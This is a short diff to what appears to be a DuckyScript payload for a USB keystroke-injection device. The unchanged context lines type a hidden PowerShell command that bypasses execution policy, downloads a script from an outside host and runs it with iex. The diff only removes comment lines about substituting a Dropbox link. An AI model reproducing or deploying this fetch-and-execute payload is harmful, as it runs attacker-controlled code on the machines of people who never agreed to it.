@@ -10,6 +10,4 @@ GUI r
 DELAY 500
 STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';iwr jakoby.lol/aucrjmf | iex
 ENTER
-REM
-REM     Remember to replace the link with your DropBox shared link for the intended file to download
-REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
+
